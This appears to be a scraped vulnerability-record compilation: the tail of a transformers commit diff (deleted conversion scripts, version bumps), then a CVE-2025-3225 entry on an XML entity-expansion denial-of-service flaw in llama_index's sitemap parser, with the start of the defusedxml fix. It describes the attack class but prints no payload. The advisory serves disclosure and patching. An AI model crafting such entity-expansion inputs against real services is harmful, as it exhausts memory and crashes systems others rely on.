 delete mode 100755 src/transformers/models/byt5/convert_byt5_original_tf_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/canine/convert_canine_original_tf_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/chameleon/convert_chameleon_weights_to_hf.py
 delete mode 100644 src/transformers/models/chinese_clip/convert_chinese_clip_original_pytorch_to_hf.py
 delete mode 100644 src/transformers/models/clap/convert_clap_original_pytorch_to_hf.py
 delete mode 100644 src/transformers/models/clip/convert_clip_original_pytorch_to_hf.py
 delete mode 100644 src/transformers/models/clipseg/convert_clipseg_original_pytorch_to_hf.py
 delete mode 100644 src/transformers/models/clvp/convert_clvp_to_hf.py
 delete mode 100644 src/transformers/models/colpali/convert_colpali_weights_to_hf.py
 delete mode 100644 src/transformers/models/conditional_detr/convert_conditional_detr_original_pytorch_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/convbert/convert_convbert_original_tf1_checkpoint_to_pytorch_and_tf2.py
 delete mode 100644 src/transformers/models/convnext/convert_convnext_to_pytorch.py
 delete mode 100644 src/transformers/models/convnextv2/convert_convnextv2_to_pytorch.py
 delete mode 100644 src/transformers/models/cvt/convert_cvt_original_pytorch_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/dab_detr/convert_dab_detr_original_pytorch_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/dac/convert_dac_checkpoint.py
 delete mode 100644 src/transformers/models/data2vec/convert_data2vec_audio_original_pytorch_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/data2vec/convert_data2vec_text_original_pytorch_checkpoint_to_pytorch.py
 delete mode 100755 src/transformers/models/data2vec/convert_data2vec_vision_original_pytorch_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/deformable_detr/convert_deformable_detr_to_pytorch.py
 delete mode 100644 src/transformers/models/deit/convert_deit_timm_to_pytorch.py
 delete mode 100644 src/transformers/models/deprecated/bort/convert_bort_original_gluonnlp_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/deprecated/deta/convert_deta_resnet_to_pytorch.py
 delete mode 100644 src/transformers/models/deprecated/deta/convert_deta_swin_to_pytorch.py
 delete mode 100644 src/transformers/models/deprecated/efficientformer/convert_efficientformer_original_pytorch_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/deprecated/gptsan_japanese/convert_gptsan_tf_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/deprecated/jukebox/convert_jukebox.py
 delete mode 100644 src/transformers/models/deprecated/mega/convert_mega_original_pytorch_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/deprecated/trajectory_transformer/convert_trajectory_transformer_original_pytorch_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/deprecated/transfo_xl/convert_transfo_xl_original_tf_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/deprecated/van/convert_van_to_pytorch.py
 delete mode 100644 src/transformers/models/deprecated/vit_hybrid/convert_vit_hybrid_timm_to_pytorch.py
 delete mode 100644 src/transformers/models/depth_anything/convert_depth_anything_to_hf.py
 delete mode 100644 src/transformers/models/depth_anything/convert_distill_any_depth_to_hf.py
 delete mode 100644 src/transformers/models/depth_pro/convert_depth_pro_weights_to_hf.py
 delete mode 100644 src/transformers/models/detr/convert_detr_original_pytorch_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/detr/convert_detr_to_pytorch.py
 delete mode 100644 src/transformers/models/dialogpt/convert_dialogpt_original_pytorch_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/dinov2/convert_dinov2_to_hf.py
 delete mode 100644 src/transformers/models/dinov2_with_registers/convert_dinov2_with_registers_to_hf.py
 delete mode 100644 src/transformers/models/dit/convert_dit_unilm_to_pytorch.py
 delete mode 100644 src/transformers/models/donut/convert_donut_to_pytorch.py
 delete mode 100644 src/transformers/models/dpr/convert_dpr_original_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/dpt/convert_dinov2_depth_to_hf.py
 delete mode 100644 src/transformers/models/dpt/convert_dpt_beit_to_hf.py
 delete mode 100644 src/transformers/models/dpt/convert_dpt_hybrid_to_pytorch.py
 delete mode 100644 src/transformers/models/dpt/convert_dpt_swinv2_to_hf.py
 delete mode 100644 src/transformers/models/dpt/convert_dpt_to_pytorch.py
 delete mode 100644 src/transformers/models/efficientnet/convert_efficientnet_to_pytorch.py
 delete mode 100644 src/transformers/models/electra/convert_electra_original_tf_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/emu3/convert_emu3_weights_to_hf.py
 delete mode 100644 src/transformers/models/encodec/convert_encodec_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/esm/convert_esm.py
 delete mode 100644 src/transformers/models/falcon/convert_custom_code_checkpoint.py
 delete mode 100644 src/transformers/models/fastspeech2_conformer/convert_fastspeech2_conformer_original_pytorch_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/fastspeech2_conformer/convert_hifigan.py
 delete mode 100644 src/transformers/models/fastspeech2_conformer/convert_model_with_hifigan.py
 delete mode 100644 src/transformers/models/flava/convert_dalle_to_flava_codebook.py
 delete mode 100644 src/transformers/models/flava/convert_flava_original_pytorch_to_hf.py
 delete mode 100644 src/transformers/models/fnet/convert_fnet_original_flax_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/focalnet/convert_focalnet_to_hf_format.py
 delete mode 100755 src/transformers/models/fsmt/convert_fsmt_original_pytorch_checkpoint_to_pytorch.py
 delete mode 100755 src/transformers/models/funnel/convert_funnel_original_tf_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/fuyu/convert_fuyu_model_weights_to_hf.py
 delete mode 100644 src/transformers/models/gemma/convert_gemma_weights_to_hf.py
 delete mode 100644 src/transformers/models/gemma2/convert_gemma2_weights_to_hf.py
 delete mode 100644 src/transformers/models/gemma3/convert_gemma3_weights_orbax_to_hf.py
 delete mode 100644 src/transformers/models/git/convert_git_to_pytorch.py
 delete mode 100644 src/transformers/models/glm/convert_glm_weights_to_hf.py
 delete mode 100644 src/transformers/models/glpn/convert_glpn_to_pytorch.py
 delete mode 100644 src/transformers/models/got_ocr2/convert_got_ocr2_weights_to_hf.py
 delete mode 100755 src/transformers/models/gpt2/convert_gpt2_original_tf_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/gpt_neo/convert_gpt_neo_mesh_tf_to_pytorch.py
 delete mode 100644 src/transformers/models/gpt_sw3/convert_megatron_to_pytorch.py
 delete mode 100644 src/transformers/models/grounding_dino/convert_grounding_dino_to_hf.py
 delete mode 100644 src/transformers/models/groupvit/convert_groupvit_nvlab_to_hf.py
 delete mode 100644 src/transformers/models/hiera/convert_hiera_to_hf.py
 delete mode 100644 src/transformers/models/hubert/convert_distilhubert_original_s3prl_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/hubert/convert_hubert_original_pytorch_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/hubert/convert_hubert_original_s3prl_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/idefics2/convert_idefics2_weights_to_hf.py
 delete mode 100644 src/transformers/models/idefics3/convert_idefics3_weights_to_hf.py
 delete mode 100644 src/transformers/models/ijepa/convert_ijepa_to_hf.py
 delete mode 100644 src/transformers/models/imagegpt/convert_imagegpt_original_tf2_to_pytorch.py
 delete mode 100644 src/transformers/models/instructblip/convert_instructblip_original_to_pytorch.py
 delete mode 100644 src/transformers/models/instructblipvideo/convert_instructblipvideo_original_to_pytorch.py
 delete mode 100644 src/transformers/models/kosmos2/convert_kosmos2_original_pytorch_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/levit/convert_levit_timm_to_pytorch.py
 delete mode 100644 src/transformers/models/llama/convert_llama_weights_to_hf.py
 delete mode 100644 src/transformers/models/llama4/convert_llama4_weights_to_hf.py
 delete mode 100644 src/transformers/models/llava/convert_llava_weights_to_hf.py
 delete mode 100644 src/transformers/models/llava_next/convert_llava_next_weights_to_hf.py
 delete mode 100644 src/transformers/models/llava_next_video/convert_llava_next_video_weights_to_hf.py
 delete mode 100644 src/transformers/models/llava_onevision/convert_llava_onevision_weights_to_hf.py
 delete mode 100644 src/transformers/models/longformer/convert_longformer_original_pytorch_lightning_to_pytorch.py
 delete mode 100644 src/transformers/models/longt5/convert_longt5x_checkpoint_to_flax.py
 delete mode 100644 src/transformers/models/luke/convert_luke_original_pytorch_checkpoint_to_pytorch.py
 delete mode 100755 src/transformers/models/lxmert/convert_lxmert_original_tf_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/m2m_100/convert_m2m100_original_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/mamba/convert_mamba_ssm_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/mamba2/convert_mamba2_ssm_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/marian/convert_marian_tatoeba_to_pytorch.py
 delete mode 100644 src/transformers/models/marian/convert_marian_to_pytorch.py
 delete mode 100644 src/transformers/models/mask2former/convert_mask2former_original_pytorch_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/maskformer/convert_maskformer_original_pytorch_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/maskformer/convert_maskformer_resnet_to_pytorch.py
 delete mode 100644 src/transformers/models/maskformer/convert_maskformer_swin_to_pytorch.py
 delete mode 100644 src/transformers/models/mbart/convert_mbart_original_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/megatron_bert/convert_megatron_bert_checkpoint.py
 delete mode 100644 src/transformers/models/megatron_gpt2/convert_megatron_gpt2_checkpoint.py
 delete mode 100644 src/transformers/models/mimi/convert_mimi_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/mistral/convert_mistral_weights_to_hf.py
 delete mode 100644 src/transformers/models/mistral3/convert_mistral3_weights_to_hf.py
 delete mode 100644 src/transformers/models/mixtral/convert_mixtral_weights_to_hf.py
 delete mode 100644 src/transformers/models/mllama/convert_mllama_weights_to_hf.py
 delete mode 100644 src/transformers/models/mluke/convert_mluke_original_pytorch_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/mobilebert/convert_mobilebert_original_tf_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/mobilenet_v1/convert_original_tf_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/mobilenet_v2/convert_original_tf_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/mobilevit/convert_mlcvnets_to_pytorch.py
 delete mode 100644 src/transformers/models/mobilevitv2/convert_mlcvnets_to_pytorch.py
 delete mode 100644 src/transformers/models/moonshine/convert_usefulsensors_to_hf.py
 delete mode 100644 src/transformers/models/moshi/convert_moshi_transformers.py
 delete mode 100644 src/transformers/models/mra/convert_mra_pytorch_to_pytorch.py
 delete mode 100644 src/transformers/models/musicgen/convert_musicgen_transformers.py
 delete mode 100644 src/transformers/models/musicgen_melody/convert_musicgen_melody_transformers.py
 delete mode 100644 src/transformers/models/myt5/convert_myt5_original_tf_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/nemotron/convert_nemotron_nemo_to_hf.py
 delete mode 100644 src/transformers/models/nllb_moe/convert_nllb_moe_sharded_original_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/nougat/convert_nougat_to_hf.py
 delete mode 100644 src/transformers/models/nystromformer/convert_nystromformer_original_pytorch_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/olmo/convert_olmo_weights_to_hf.py
 delete mode 100644 src/transformers/models/olmo2/convert_olmo2_weights_to_hf.py
 delete mode 100644 src/transformers/models/olmoe/convert_olmoe_weights_to_hf.py
 delete mode 100644 src/transformers/models/omdet_turbo/convert_omdet_turbo_to_hf.py
 delete mode 100644 src/transformers/models/oneformer/convert_to_hf_oneformer.py
 delete mode 100755 src/transformers/models/openai/convert_openai_original_tf_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/opt/convert_opt_original_pytorch_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/owlv2/convert_owlv2_to_hf.py
 delete mode 100644 src/transformers/models/owlvit/convert_owlvit_original_flax_to_hf.py
 delete mode 100644 src/transformers/models/paligemma/convert_paligemma2_weights_to_hf.py
 delete mode 100644 src/transformers/models/paligemma/convert_paligemma_weights_to_hf.py
 delete mode 100644 src/transformers/models/pegasus/convert_pegasus_tf_to_pytorch.py
 delete mode 100644 src/transformers/models/perceiver/convert_perceiver_haiku_to_pytorch.py
 delete mode 100644 src/transformers/models/persimmon/convert_persimmon_weights_to_hf.py
 delete mode 100644 src/transformers/models/phi/convert_phi_weights_to_hf.py
 delete mode 100644 src/transformers/models/phi4_multimodal/convert_phi4_multimodal_weights_to_hf.py
 delete mode 100644 src/transformers/models/pix2struct/convert_pix2struct_original_pytorch_to_hf.py
 delete mode 100644 src/transformers/models/pixtral/convert_pixtral_weights_to_hf.py
 delete mode 100644 src/transformers/models/plbart/convert_plbart_original_checkpoint_to_torch.py
 delete mode 100644 src/transformers/models/poolformer/convert_poolformer_original_to_pytorch.py
 delete mode 100644 src/transformers/models/pop2piano/convert_pop2piano_weights_to_hf.py
 delete mode 100644 src/transformers/models/prompt_depth_anything/convert_prompt_depth_anything_to_hf.py
 delete mode 100644 src/transformers/models/prophetnet/convert_prophetnet_original_pytorch_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/pvt/convert_pvt_to_pytorch.py
 delete mode 100644 src/transformers/models/pvt_v2/convert_pvt_v2_to_pytorch.py
 delete mode 100644 src/transformers/models/recurrent_gemma/convert_recurrent_gemma_to_hf.py
 delete mode 100755 src/transformers/models/reformer/convert_reformer_trax_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/regnet/convert_regnet_seer_10b_to_pytorch.py
 delete mode 100644 src/transformers/models/regnet/convert_regnet_to_pytorch.py
 delete mode 100755 src/transformers/models/rembert/convert_rembert_tf_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/resnet/convert_resnet_to_pytorch.py
 delete mode 100644 src/transformers/models/roberta/convert_roberta_original_pytorch_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/roberta_prelayernorm/convert_roberta_prelayernorm_original_pytorch_checkpoint_to_pytorch.py
 delete mode 100755 src/transformers/models/roformer/convert_roformer_original_tf_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/rt_detr/convert_rt_detr_original_pytorch_checkpoint_to_hf.py
 delete mode 100644 src/transformers/models/rt_detr_v2/convert_rt_detr_v2_weights_to_hf.py
 delete mode 100644 src/transformers/models/rwkv/convert_rwkv_checkpoint_to_hf.py
 delete mode 100644 src/transformers/models/sam/convert_sam_to_hf.py
 delete mode 100644 src/transformers/models/seamless_m4t/convert_fairseq2_to_hf.py
 delete mode 100644 src/transformers/models/seamless_m4t_v2/convert_fairseq2_to_hf.py
 delete mode 100644 src/transformers/models/segformer/convert_segformer_original_to_pytorch.py
 delete mode 100644 src/transformers/models/seggpt/convert_seggpt_to_hf.py
 delete mode 100644 src/transformers/models/sew/convert_sew_original_pytorch_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/sew_d/convert_sew_d_original_pytorch_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/shieldgemma2/convert_shieldgemma2_weights_orbax_to_hf.py
 delete mode 100644 src/transformers/models/siglip/convert_siglip_to_hf.py
 delete mode 100644 src/transformers/models/siglip2/convert_siglip2_to_hf.py
 delete mode 100644 src/transformers/models/speech_encoder_decoder/convert_mbart_wav2vec2_seq2seq_original_to_pytorch.py
 delete mode 100644 src/transformers/models/speech_encoder_decoder/convert_speech_to_text_wav2vec2_seq2seq_original_to_pytorch.py
 delete mode 100644 src/transformers/models/speech_to_text/convert_s2t_fairseq_to_tfms.py
 delete mode 100644 src/transformers/models/speecht5/convert_hifigan.py
 delete mode 100644 src/transformers/models/speecht5/convert_speecht5_original_pytorch_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/superglue/convert_superglue_to_hf.py
 delete mode 100644 src/transformers/models/superpoint/convert_superpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/swiftformer/convert_swiftformer_original_to_hf.py
 delete mode 100644 src/transformers/models/swin/convert_swin_simmim_to_pytorch.py
 delete mode 100644 src/transformers/models/swin/convert_swin_timm_to_pytorch.py
 delete mode 100644 src/transformers/models/swin2sr/convert_swin2sr_original_to_pytorch.py
 delete mode 100644 src/transformers/models/swinv2/convert_swinv2_timm_to_pytorch.py
 delete mode 100644 src/transformers/models/switch_transformers/convert_big_switch.py
 delete mode 100644 src/transformers/models/switch_transformers/convert_switch_transformers_original_flax_checkpoint_to_pytorch.py
 delete mode 100755 src/transformers/models/t5/convert_t5_original_tf_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/t5/convert_t5x_checkpoint_to_flax.py
 delete mode 100755 src/transformers/models/t5/convert_t5x_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/table_transformer/convert_table_transformer_to_hf.py
 delete mode 100644 src/transformers/models/table_transformer/convert_table_transformer_to_hf_no_timm.py
 delete mode 100644 src/transformers/models/tapas/convert_tapas_original_tf_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/textnet/convert_textnet_to_hf.py
 delete mode 100644 src/transformers/models/timesformer/convert_timesformer_to_pytorch.py
 delete mode 100644 src/transformers/models/trocr/convert_trocr_unilm_to_pytorch.py
 delete mode 100644 src/transformers/models/udop/convert_udop_to_hf.py
 delete mode 100644 src/transformers/models/umt5/convert_umt5_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/unispeech/convert_unispeech_original_pytorch_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/unispeech_sat/convert_unispeech_original_s3prl_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/unispeech_sat/convert_unispeech_sat_original_pytorch_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/univnet/convert_univnet.py
 delete mode 100644 src/transformers/models/upernet/convert_convnext_upernet_to_pytorch.py
 delete mode 100644 src/transformers/models/upernet/convert_swin_upernet_to_pytorch.py
 delete mode 100644 src/transformers/models/video_llava/convert_video_llava_weights_to_hf.py
 delete mode 100644 src/transformers/models/videomae/convert_videomae_to_pytorch.py
 delete mode 100644 src/transformers/models/vilt/convert_vilt_original_to_pytorch.py
 delete mode 100644 src/transformers/models/vipllava/convert_vipllava_weights_to_hf.py
 delete mode 100644 src/transformers/models/visual_bert/convert_visual_bert_original_pytorch_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/vit/convert_dino_to_pytorch.py
 delete mode 100644 src/transformers/models/vit/convert_vit_timm_to_pytorch.py
 delete mode 100644 src/transformers/models/vit_mae/convert_vit_mae_to_pytorch.py
 delete mode 100644 src/transformers/models/vit_msn/convert_msn_to_pytorch.py
 delete mode 100644 src/transformers/models/vitmatte/convert_vitmatte_to_hf.py
 delete mode 100644 src/transformers/models/vitpose/convert_vitpose_to_hf.py
 delete mode 100644 src/transformers/models/vits/convert_original_checkpoint.py
 delete mode 100644 src/transformers/models/vivit/convert_vivit_flax_to_pytorch.py
 delete mode 100644 src/transformers/models/wav2vec2/convert_wav2vec2_original_pytorch_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/wav2vec2/convert_wav2vec2_original_s3prl_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/wav2vec2_bert/convert_wav2vec2_seamless_checkpoint.py
 delete mode 100644 src/transformers/models/wav2vec2_conformer/convert_wav2vec2_conformer_original_pytorch_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/wavlm/convert_wavlm_original_pytorch_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/wavlm/convert_wavlm_original_s3prl_checkpoint_to_pytorch.py
 delete mode 100755 src/transformers/models/whisper/convert_openai_to_hf.py
 delete mode 100644 src/transformers/models/x_clip/convert_x_clip_original_pytorch_to_hf.py
 delete mode 100644 src/transformers/models/xglm/convert_xglm_original_ckpt_to_trfms.py
 delete mode 100755 src/transformers/models/xlm/convert_xlm_original_pytorch_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/xlm_roberta_xl/convert_xlm_roberta_xl_original_pytorch_checkpoint_to_pytorch.py
 delete mode 100755 src/transformers/models/xlnet/convert_xlnet_original_tf_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/xmod/convert_xmod_original_pytorch_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/yolos/convert_yolos_to_pytorch.py
 delete mode 100644 src/transformers/models/yoso/convert_yoso_pytorch_to_pytorch.py
 delete mode 100644 src/transformers/models/zoedepth/convert_zoedepth_to_hf.py

diff --git a/examples/flax/question-answering/run_qa.py b/examples/flax/question-answering/run_qa.py
index c42911f6638d..63d9c918cc44 100644
--- a/examples/flax/question-answering/run_qa.py
+++ b/examples/flax/question-answering/run_qa.py
@@ -61,7 +61,7 @@
 logger = logging.getLogger(__name__)
 
 # Will error if the minimal version of Transformers is not installed. Remove at your own risks.
-check_min_version("4.51.0.dev0")
+check_min_version("4.51.0")
 
 Array = Any
 Dataset = datasets.arrow_dataset.Dataset
diff --git a/examples/flax/speech-recognition/run_flax_speech_recognition_seq2seq.py b/examples/flax/speech-recognition/run_flax_speech_recognition_seq2seq.py
index 6028f7408bad..38258ecec303 100644
--- a/examples/flax/speech-recognition/run_flax_speech_recognition_seq2seq.py
+++ b/examples/flax/speech-recognition/run_flax_speech_recognition_seq2seq.py
@@ -60,7 +60,7 @@
 
 
 # Will error if the minimal version of Transformers is not installed. Remove at your own risk.
-check_min_version("4.51.0.dev0")
+check_min_version("4.51.0")
 
 require_version("datasets>=2.14.0", "To fix: pip install -r examples/flax/speech-recognition/requirements.txt")
 
diff --git a/examples/flax/text-classification/run_flax_glue.py b/examples/flax/text-classification/run_flax_glue.py
index 522a601551da..a3d952a1a2bb 100755
--- a/examples/flax/text-classification/run_flax_glue.py
+++ b/examples/flax/text-classification/run_flax_glue.py
@@ -56,7 +56,7 @@
 
 logger = logging.getLogger(__name__)
 # Will error if the minimal version of Transformers is not installed. Remove at your own risks.
-check_min_version("4.51.0.dev0")
+check_min_version("4.51.0")
 
 Array = Any
 Dataset = datasets.arrow_dataset.Dataset
diff --git a/examples/flax/token-classification/run_flax_ner.py b/examples/flax/token-classification/run_flax_ner.py
index 5c8fa77cbb93..4b232115c0d4 100644
--- a/examples/flax/token-classification/run_flax_ner.py
+++ b/examples/flax/token-classification/run_flax_ner.py
@@ -57,7 +57,7 @@
 
 logger = logging.getLogger(__name__)
 # Will error if the minimal version of Transformers is not installed. Remove at your own risks.
-check_min_version("4.51.0.dev0")
+check_min_version("4.51.0")
 
 require_version("datasets>=1.8.0", "To fix: pip install -r examples/pytorch/token-classification/requirements.txt")
 
diff --git a/examples/pytorch/audio-classification/run_audio_classification.py b/examples/pytorch/audio-classification/run_audio_classification.py
index 5d1e0390f61d..89915308a1e0 100644
--- a/examples/pytorch/audio-classification/run_audio_classification.py
+++ b/examples/pytorch/audio-classification/run_audio_classification.py
@@ -45,7 +45,7 @@
 logger = logging.getLogger(__name__)
 
 # Will error if the minimal version of Transformers is not installed. Remove at your own risks.
-check_min_version("4.51.0.dev0")
+check_min_version("4.51.0")
 
 require_version("datasets>=1.14.0", "To fix: pip install -r examples/pytorch/audio-classification/requirements.txt")
 
diff --git a/examples/pytorch/contrastive-image-text/run_clip.py b/examples/pytorch/contrastive-image-text/run_clip.py
index 232c58c417a1..bdd803e646b4 100644
--- a/examples/pytorch/contrastive-image-text/run_clip.py
+++ b/examples/pytorch/contrastive-image-text/run_clip.py
@@ -54,7 +54,7 @@
 logger = logging.getLogger(__name__)
 
 # Will error if the minimal version of Transformers is not installed. Remove at your own risks.
-check_min_version("4.51.0.dev0")
+check_min_version("4.51.0")
 
 require_version("datasets>=1.8.0", "To fix: pip install -r examples/pytorch/contrastive-image-text/requirements.txt")
 
diff --git a/examples/pytorch/image-classification/run_image_classification.py b/examples/pytorch/image-classification/run_image_classification.py
index c941465babe0..c0d2001b9bea 100755
--- a/examples/pytorch/image-classification/run_image_classification.py
+++ b/examples/pytorch/image-classification/run_image_classification.py
@@ -57,7 +57,7 @@
 logger = logging.getLogger(__name__)
 
 # Will error if the minimal version of Transformers is not installed. Remove at your own risks.
-check_min_version("4.51.0.dev0")
+check_min_version("4.51.0")
 
 require_version("datasets>=2.14.0", "To fix: pip install -r examples/pytorch/image-classification/requirements.txt")
 
diff --git a/examples/pytorch/image-classification/run_image_classification_no_trainer.py b/examples/pytorch/image-classification/run_image_classification_no_trainer.py
index 564588a52b8b..d837440405ba 100644
--- a/examples/pytorch/image-classification/run_image_classification_no_trainer.py
+++ b/examples/pytorch/image-classification/run_image_classification_no_trainer.py
@@ -49,7 +49,7 @@
 
 
 # Will error if the minimal version of Transformers is not installed. Remove at your own risks.
-check_min_version("4.51.0.dev0")
+check_min_version("4.51.0")
 
 logger = get_logger(__name__)
 
diff --git a/examples/pytorch/image-pretraining/run_mae.py b/examples/pytorch/image-pretraining/run_mae.py
index fdffbda0beea..208c43c2b4e6 100644
--- a/examples/pytorch/image-pretraining/run_mae.py
+++ b/examples/pytorch/image-pretraining/run_mae.py
@@ -43,7 +43,7 @@
 logger = logging.getLogger(__name__)
 
 # Will error if the minimal version of Transformers is not installed. Remove at your own risks.
-check_min_version("4.51.0.dev0")
+check_min_version("4.51.0")
 
 require_version("datasets>=1.8.0", "To fix: pip install -r examples/pytorch/image-pretraining/requirements.txt")
 
diff --git a/examples/pytorch/image-pretraining/run_mim.py b/examples/pytorch/image-pretraining/run_mim.py
index 3f497252d3a6..c0ae1cec1c1d 100644
--- a/examples/pytorch/image-pretraining/run_mim.py
+++ b/examples/pytorch/image-pretraining/run_mim.py
@@ -48,7 +48,7 @@
 logger = logging.getLogger(__name__)
 
 # Will error if the minimal version of Transformers is not installed. Remove at your own risks.
-check_min_version("4.51.0.dev0")
+check_min_version("4.51.0")
 
 require_version("datasets>=1.8.0", "To fix: pip install -r examples/pytorch/image-pretraining/requirements.txt")
 
diff --git a/examples/pytorch/image-pretraining/run_mim_no_trainer.py b/examples/pytorch/image-pretraining/run_mim_no_trainer.py
index 5935ce438478..c60787764c24 100644
--- a/examples/pytorch/image-pretraining/run_mim_no_trainer.py
+++ b/examples/pytorch/image-pretraining/run_mim_no_trainer.py
@@ -53,7 +53,7 @@
 logger = logging.getLogger(__name__)
 
 # Will error if the minimal version of Transformers is not installed. Remove at your own risks.
-check_min_version("4.51.0.dev0")
+check_min_version("4.51.0")
 
 require_version("datasets>=1.8.0", "To fix: pip install -r examples/pytorch/image-pretraining/requirements.txt")
 
diff --git a/examples/pytorch/instance-segmentation/run_instance_segmentation.py b/examples/pytorch/instance-segmentation/run_instance_segmentation.py
index 6229c6f36583..6cb6859fd976 100644
--- a/examples/pytorch/instance-segmentation/run_instance_segmentation.py
+++ b/examples/pytorch/instance-segmentation/run_instance_segmentation.py
@@ -46,7 +46,7 @@
 logger = logging.getLogger(__name__)
 
 # Will error if the minimal version of Transformers is not installed. Remove at your own risks.
-check_min_version("4.51.0.dev0")
+check_min_version("4.51.0")
 
 require_version("datasets>=2.0.0", "To fix: pip install -r examples/pytorch/inst
... [truncated]

================================================================================


CVE ID: CVE-2025-3225
Published: 2025-07-07T10:15:27.047
Modified: 2025-07-30T21:24:40.497
CVSS Score: 7.5 (HIGH) [v3.0]
CVSS Vector: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H

CWE Categories:
  - CWE-776: CWE-776

Description:
An XML Entity Expansion vulnerability, also known as a 'billion laughs' attack, exists in the sitemap parser of the run-llama/llama_index repository, specifically affecting version v0.12.21. This vulnerability allows an attacker to supply a malicious Sitemap XML, leading to a Denial of Service (DoS) by exhausting system memory and potentially causing a system crash. The issue is resolved in version v0.12.29.

References (2):
  1. https://github.com/run-llama/llama_index/commit/4f6ee062b19212106a2632af9c9521fc7f0a3584 [Patch]
  2. https://huntr.com/bounties/e33c0699-e9a2-49aa-837b-5363205637a2 [Exploit, Third Party Advisory]

Attempting to extract code examples from references...

--- Code from https://github.com/run-llama/llama_index/commit/4f6ee062b19212106a2632af9c9521fc7f0a3584 ---
From 4f6ee062b19212106a2632af9c9521fc7f0a3584 Mon Sep 17 00:00:00 2001
From: Massimiliano Pippi <mpippi@gmail.com>
Date: Thu, 3 Apr 2025 21:59:13 +0200
Subject: [PATCH] fix: use defusexml instead of xml.etree (#18362)

---
 .../llama_index/readers/papers/pubmed/base.py | 19 +++++++++++--------
 .../llama-index-readers-papers/pyproject.toml |  3 ++-
 .../llama_index/readers/stripe_docs/base.py   |  9 +++++----
 .../pyproject.toml                            |  3 ++-
 .../llama_index/readers/web/sitemap/base.py   |  7 ++++---
 .../llama-index-readers-web/pyproject.toml    |  3 ++-
 6 files changed, 26 insertions(+), 18 deletions(-)

diff --git a/llama-index-integrations/readers/llama-index-readers-papers/llama_index/readers/papers/pubmed/base.py b/llama-index-integrations/readers/llama-index-readers-papers/llama_index/readers/papers/pubmed/base.py
index 8869c50520..7373111969 100644
--- a/llama-index-integrations/readers/llama-index-readers-papers/llama_index/readers/papers/pubmed/base.py
+++ b/llama-index-integrations/readers/llama-index-readers-papers/llama_index/readers/papers/pubmed/base.py
@@ -2,12 +2,14 @@
 
 from typing import List, Optional
 
+from defusedxml import ElementTree as safe_xml
 from llama_index.core.readers.base import BaseReader
 from llama_index.core.schema import Document
 
 
 class PubmedReader(BaseReader):
-    """Pubmed Reader.
+    """
+    Pubmed Reader.
 
     Gets a search query, return a list of Documents of the top corresponding scientific papers on Pubmed.
     """
@@ -17,7 +19,8 @@ def load_data_bioc(
         search_query: str,
         max_results: Optional[int] = 10,
